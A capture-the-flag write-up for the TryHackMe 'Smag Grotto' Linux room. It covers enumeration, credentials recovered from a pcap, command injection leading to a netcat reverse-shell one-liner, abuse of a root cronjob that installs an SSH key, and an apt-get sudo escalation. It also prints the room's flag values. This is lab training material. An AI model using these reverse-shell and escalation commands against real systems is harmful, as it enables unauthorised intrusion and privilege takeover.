## Smag Grotto - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/smaggrotto)

**IP: 10.10.190.157**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Ffuf, Wireshark<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.190.157

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
  |   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
  |_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Smag
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.190.157/FUZZ -w /usr/share/wordlists/dirb/common.txt

  .htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 48ms]
  .hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1020ms]
  .htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3025ms]
  index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 48ms]
  mail                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 48ms]
  server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 47ms]
  :: Progress: [4614/4614] :: Job [1/1] :: 843 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
  ```
  
- OK, so when you visit `/mail` directory, you will find a `.pcap` file, download it and open it in Wireshark. There is a POST request for `login.php`, right click on it and follow the HTTP stream in order to get the login page and credentials.

  ```
  POST /login.php HTTP/1.1
  Host: development.smag.thm
  User-Agent: curl/7.47.0
  Accept: */*
  Content-Length: 39
  Content-Type: application/x-www-form-urlencoded
  
  username=helpdesk&password=cH4nG3M3_n0w
  HTTP/1.1 200 OK
  Date: Wed, 03 Jun 2020 18:04:07 GMT
  Server: Apache/2.4.18 (Ubuntu)
  Content-Length: 0
  Content-Type: text/html; charset=UTF-8
  ```
  
- Perfect, now we have another endpoint `development.smag.thm` and credentials. After logging in you will have a option to inject commands, so prepare your reverse shells and let's go! Don't forget to add `development.smag.thm` to `/etc/hosts`.

---

## ⚙️ Shell Access

- Start a listener and use any reverse shell you like. For me classic bash one-liner didn't work, but this one did.

  ```
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 7777 >/tmp/f

  nc -lvnp 7777                     
  listening on [any] 7777 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.190.157] 51680
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- Create a putty shell and start catching the flags.

---

## 🧍 User Privilege Escalation

- OK, so this is a bit tricky, you can't read neither flag as user `www-data` so we have to escalate few times. When it comes to Jake, I did some enumeration and our way to escalate is through cronjobs.

  ```
  www-data@smag:/home/jake$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  *  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
  ```
  
- I also checked the backup file to see what it actually is and it's a an RSA public key.

  ```
  www-data@smag:/home/jake$ cat /opt/.backups/jake_id_rsa.pub.backup 
  ssh-rsa [SNIP!] kali@kali
  ```
  
- So right now, since cronjobs are reading Public RSA key and saving it to `/home/jake/.ssh/authorized_keys`, we are going to create a new pair of RSA keys and replace the current one with our keys and then login with SSH. Trust me, it's much simpler than it sounds.
  First we create set of keys.

  ```
  www-data@smag:/home/jake$ ssh-keygen -f /tmp/jake_key -N ""
  
  Generating public/private rsa key pair.
  Your identification has been saved in /tmp/jake_key.
  Your public key has been saved in /tmp/jake_key.pub.
  The key fingerprint is:
  SHA256:[SNIP!] www-data@smag
  The key's randomart image is:
  +---[RSA 2048]----+
  [SNIP!]
  +----[SHA256]-----+
  ```

- Now, since we created a new pair of keys now let's replace old public key with it. After replacing public key, change the permission of new key to 600 and wait for cronjobs to run. After a minute, login with SSH as `jake` using your newly created public key.

  ```
  backup a@smag:/home/jake$ cat /tmp/jake_key.pub > /opt/.backups/jake_id_rsa.pub.b

  chmod 600 /tmp/jake_key
  
  www-data@smag:/home/jake$ ssh -i /tmp/jake_key jake@localhost 
  Could not create directory '/var/www/.ssh'.
  The authenticity of host 'localhost (::1)' can't be established.
  [SNIP!]
  Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
  Last login: Fri Jun  5 10:15:15 2020
  jake@smag:~$ whoami
  jake
  ```

- Alright, now we can read the first flag.

  ```
  jake@smag:~$ ls
  user.txt
  
  jake@smag:~$ cat user.txt 
  iusGorV7EbmxM5AuIe2w499msaSuqU3j
  ```

- Escalating to root is the next step.

---

## 👑 Root Privilege Escalation

- This one wasn't hard, `sudo -l` will do all the job, and you can find a one-liner exploit on GTFOBins. Of course, read the flag after escalating.

  ```
  jake@smag:~$ sudo -l
  Matching Defaults entries for jake on smag:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jake may run the following commands on smag:
      (ALL : ALL) NOPASSWD: /usr/bin/apt-get
  
  
  jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
  # whoami
  root
  
  # id
  uid=0(root) gid=0(root) groups=0(root)
  
  # cat /root/root.txt
  uJr6zRgetaniyHVRqqL58uRasybBKz2T
  ``` 

---

## 🏁 Flags

- **User Flag**: `iusGorV7EbmxM5AuIe2w499msaSuqU3j`
- **Root Flag**: `uJr6zRgetaniyHVRqqL58uRasybBKz2T`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Remembering how to escalate with SSH keys...`

- What did I learn?
  `Nothing new`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
